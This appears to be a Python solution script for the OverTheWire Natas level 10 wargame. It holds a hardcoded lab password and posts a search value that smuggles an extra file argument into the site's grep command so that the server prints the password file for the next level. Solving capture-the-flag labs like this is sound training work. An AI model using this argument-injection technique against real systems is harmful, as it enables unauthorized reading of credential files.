import requests
import re

username = "natas10"
password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"
url = f"http://{username}.natas.labs.overthewire.org/"

session = requests.Session()

response = session.post(url, auth=(username, password), data={"needle": ". /etc/natas_webpass/natas11", "submit": "submit"})

content = response.text

flag = re.findall(r"<pre>\n/etc/natas_webpass/natas11:(.*)\n", content)[0]

print(flag)